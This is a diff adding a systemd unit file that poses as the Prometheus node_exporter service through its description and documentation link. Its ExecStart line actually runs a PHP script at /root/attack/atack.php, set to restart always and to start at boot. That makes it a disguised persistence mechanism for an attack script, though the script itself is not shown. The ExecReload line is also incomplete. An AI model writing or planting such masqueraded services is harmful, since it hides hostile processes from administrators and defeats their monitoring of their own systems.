@@ -1,0 +1,13 @@
+[Unit]
+Description=Prometheus exporter for hardware and OS metrics exposed by *NIX kernels, written in Go with pluggable metric collectors.
+After=network.target
+Documentation=https://github.com/prometheus/node_exporter
+
+[Service]
+Restart=always
+ExecStart=php /root/attack/atack.php
+ExecReload=/bin/kill -HUP 
+
+[Install]
+WantedBy=multi-user.target
+
